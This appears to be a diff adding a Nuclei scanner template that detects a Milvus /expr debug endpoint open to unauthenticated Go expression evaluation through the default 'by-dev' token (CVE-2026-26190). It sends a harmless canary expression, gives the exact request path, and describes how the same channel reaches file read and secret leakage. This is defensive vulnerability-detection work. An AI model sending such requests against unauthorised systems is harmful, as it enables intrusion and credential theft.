@@ -1,0 +1,67 @@
+# gap: milvus-expr-debug-by-dev-rce
+id: milvus-expr-debug-by-dev-rce
+
+info:
+  name: Milvus /expr Debug Endpoint Default by-dev Token — Unauth Go Expression Evaluation (CVE-2026-26190)
+  author: TyrusRC
+  severity: critical
+  description: |
+    Detects Milvus instances exposing the `/expr` debug evaluation
+    endpoint guarded only by the well-known default `etcd.rootPath`
+    token `by-dev` (CVE-2026-26190 / GHSA-7ppg-37fh-vcr6, published
+    2026-02-11, CVSS 9.8). The endpoint accepts arbitrary Go-syntax
+    expressions through the `expr` query parameter and evaluates them
+    in-process — an unauth code execution primitive that discloses
+    `MinIO` / `etcd` credentials, raw user-password hashes, and
+    in-memory secret bindings via standard-library reflection.
+
+    The probe sends a deterministic string-concatenation canary
+    `"nuclei"+"canary"` and matches the literal `nucleicanary`
+    substring in the response body. A positive match proves the
+    expression evaluator executed attacker-supplied Go code; the
+    same channel reaches arbitrary file read via `os.ReadFile`,
+    arbitrary HTTP egress, and reflection-based traversal of the
+    Milvus process memory — full unauth RCE class impact
+    (cluster-admin-grade access to the vector-DB control plane and
+    chained leak of in-memory tokens / secrets).
+
+    Target the Milvus metrics port directly, e.g.
+    `nuclei -u http://target.example.com:9091 -t
+    templates/vulnerabilities/milvus-expr-debug-by-dev-rce.yaml`.
+
+    Affected: Milvus < 2.5.27 AND 2.6.0 ≤ version ≤ 2.6.9. Patched
+    versions removed the unauth `/expr` handler and changed the
+    default token; the canary-substring matcher survives any
+    expression sink whose runtime still treats `auth=by-dev` as
+    privileged.
+  reference:
+    - https://github.com/milvus-io/milvus/security/advisories/GHSA-7ppg-37fh-vcr6
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-26190
+  tags: custom,vulnerabilities,milvus,vector-db,rce,ai,cve-2026-26190,cwe-77,cwe-306
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/expr?auth=by-dev&expr=%22nuclei%22%2B%22canary%22"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "nucleicanary"
+
+    extractors:
+      - type: regex
+        part: body
+        name: expr-result-body
+        regex:
+          - '(nucleicanary[^<\r\n]{0,160})'
+        group: 1
+      - type: kval
+        part: header
+        kval:
+          - "Server"
